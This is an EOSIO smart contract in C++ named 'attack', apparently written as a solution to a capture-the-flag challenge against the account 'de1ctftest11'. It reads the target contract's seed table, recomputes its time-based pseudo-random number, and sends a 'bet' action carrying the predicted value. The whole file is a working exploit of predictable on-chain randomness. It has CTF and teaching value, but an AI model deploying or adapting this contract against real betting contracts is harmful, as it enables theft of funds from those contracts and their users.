#include <eosio/eosio.hpp>
#include <eosio/system.hpp>
#define TARGET_ACCOUNT "de1ctftest11"
using namespace eosio;

class [[eosio::contract]] attack : public contract {
  private:

    struct [[eosio::table]] seed {
      uint64_t        key = 1;
      uint32_t        value = 1;

      auto primary_key() const { return key; }
    };

    typedef eosio::multi_index<name("seed"), seed> seed_table;

    seed_table _seed;

    int random(const int range){
      // Find the existing seed
      auto seed_iterator = _seed.begin();

      // Initialize the seed with default value if it is not found
      if (seed_iterator == _seed.end()) {
        seed_iterator = _seed.emplace( _self, [&]( auto& seed ) { });
      }

      // Generate new seed value using the existing seed value
      int prime = 65537;
      auto new_seed_value = (seed_iterator->value + (uint32_t)(eosio::current_time_point().sec_since_epoch())) % prime;
      
      
      // Get the random result in desired range
      int random_result = new_seed_value % range;
      return random_result;
    }

  public:
    using contract::contract;
    attack( name receiver, name code, datastream<const char*> ds ):contract(receiver, code, ds),
                       _seed(eosio::name(TARGET_ACCOUNT), eosio::name(TARGET_ACCOUNT).value) {}
    
    [[eosio::action]]
    void makebet()
    {
      // Ensure this action is authorized by the player
      require_auth(get_self());
      int random_num = random(5);
      print("make bet ", random_num);

      action(
        permission_level{get_self(),"active"_n},  //所需要的权限结构
        name(TARGET_ACCOUNT),                          // 调用的合约名称
        "bet"_n,                              // 合约的方法
        std::make_tuple(get_self(), random_num) // 传递的参数
      ).send();
    }
};

